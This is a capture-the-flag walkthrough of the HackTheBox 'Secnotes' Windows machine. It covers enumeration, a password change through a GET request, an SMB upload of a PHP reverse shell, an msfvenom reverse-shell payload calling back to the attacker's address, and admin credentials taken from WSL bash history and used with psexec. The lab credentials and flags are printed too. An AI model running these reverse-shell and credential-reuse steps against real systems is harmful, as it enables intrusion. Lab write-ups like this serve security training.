---
title: "Secnotes"
date: 2025-06-20
categories:
  - HackTheBox
  - Windows
tags:
  - HackTheBox
  - Windows
---

# Secnotes

![](assets/Pasted%20image%2020250518205226.png)
<!-- more -->

## Enumeration

```shell
$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.10.97
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-18 20:52 CEST
Nmap scan report for 10.10.10.97
Host is up (0.041s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         Microsoft IIS httpd 10.0
|_http-title: IIS Windows
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019 (97%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019
Aggressive OS guesses: Microsoft Windows 10 1903 - 21H1 (97%), Windows Server 2019 (91%), Microsoft Windows 10 1803 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2025-05-18T11:53:40-07:00
| smb2-time: 
|   date: 2025-05-18T18:53:41
|_  start_date: N/A
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2h20m00s, deviation: 4h02m29s, median: 0s

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   40.63 ms 10.10.14.1
2   41.14 ms 10.10.10.97

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.61 seconds
```

`Port` `8808` shows the default `IIS` site and `port` `80` shows a login form.

![](assets/Pasted%20image%2020250518205616.png)

Create an account and log in.

![](assets/Pasted%20image%2020250518205947.png)

There is a user named `tyler` that we can contact, and there is no protection against `XSS` when creating a note.

When changing the password, the request is also processed with `GET`, so we could send the request to change the password in the contact text with an `XSS`.

![](assets/Pasted%20image%2020250518235204.png)

`XSS` is not needed, only send the URL and enter as `tyler` with the new password.

![](assets/Pasted%20image%2020250518235302.png)

`tyler:92g!mA8BGjOirkL%OG*&`

Checking credentials and shares, we see that the user can write in a share.

![](assets/Pasted%20image%2020250518235608.png)

## Initial Access

This is the root folder for `IIS`, so we can upload an `aspx`, `asp`, `config`, or `php` reverse shell.

Get a `PHP` rev shell and put it in the folder, start the listener, and browse the page.


```shell
$ smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //secnotes.htb/new-site
Try "help" to get a list of possible commands.
smb: \> put shell.php
putting file shell.php as \shell.php (70.3 kb/s) (average 70.3 kb/s)
```


```shell
$ sudo rlwrap nc -lnvp 80
listening on [any] 80 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.97] 49913
SOCKET: Shell has connected! PID: 4448
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\new-site>whoami
iis apppool\newsite
```

The shell was unstable, so I put a web shell to get an `msfvenom` reverse shell.

![](assets/Pasted%20image%2020250519002132.png)

```shell
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.4 LPORT=80 -f exe -o reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: reverse.exe

smb: \> put reverse.exe
putting file reverse.exe as \reverse.exe (56.0 kb/s) (average 29.5 kb/s)
```


![](assets/Pasted%20image%2020250519002346.png)

```shell
$ sudo rlwrap nc -lnvp 80
listening on [any] 80 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.97] 50262
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\new-site>whoami
whoami
secnotes\tyler
```

Get the flag:

```shell
C:\Users\tyler\Desktop>type user.txt
type user.txt
3e39543df04f653c45220f80fed60766
```

## Privilege Escalation

Transfer `winPEAS` and find that `WSL` and `Ubuntu` are installed.

![](assets/Pasted%20image%2020250519005409.png)

Go to the root folder of the distro and search `root`'s history.

```shell
PS C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\root> type .bash_history
cd /mnt/c/
ls
cd Users/
cd /
cd ~
ls
pwd
mkdir filesystem
mount //127.0.0.1/c$ filesystem/
sudo apt install cifs-utils
mount //127.0.0.1/c$ filesystem/
mount //127.0.0.1/c$ filesystem/ -o user=administrator
cat /proc/filesystems
sudo modprobe cifs
smbclient
apt install smbclient
smbclient
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
> .bash_history 
less .bash_history
exit
```

![](assets/Pasted%20image%2020250519010931.png)

```shell
$ impacket-psexec administrator:'u6!4ZwgwOM#^OBf#Nwnh'@secnotes.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on secnotes.htb.....
[*] Found writable share ADMIN$
[*] Uploading file JstWrSBE.exe
[*] Opening SVCManager on secnotes.htb.....
[*] Creating service ldar on secnotes.htb.....
[*] Starting service ldar.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32> whoami
nt authority\system
```

## Post Exploitation

Get the flag:

```shell
C:\Users\Administrator\Desktop> type root.txt
13193dc2dd40a8c4f431cb347f764f2c
```
